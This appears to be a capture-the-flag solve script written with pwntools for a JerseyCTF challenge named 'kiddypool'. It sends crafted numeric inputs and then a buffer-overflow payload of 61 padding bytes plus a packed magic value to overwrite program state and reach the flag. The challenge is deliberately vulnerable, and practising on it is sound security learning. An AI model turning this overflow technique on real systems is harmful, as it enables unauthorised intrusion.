from pwn import *
import struct

host = "kiddypool.aws.jerseyctf.com"
port = 9001

p = remote(host, port)

# Send age input
p.recvuntil(b"How old are you")
p.sendline(b"4607182418800017408")

p.recvuntil(b"Ok sport, take your first dive into the water")
p.sendline(b"4607182418800017408")

p.recvuntil(b"Swim through the hoop!")
p.sendline(b"64")

# Wait for the prompt
p.recvuntil(b"That's pretty good! Now make your own course")

# Construct payload: 61 bytes of padding + 4-byte little-endian value 0xEBE8EBE1
payload = b"A" * 61 + struct.pack("<I", 0xEBE8EBE1)
p.sendline(payload)

# Provide the medal name
p.sendline(b"satanmyninjas")

# Finally, interact or retrieve the flag
p.interactive()
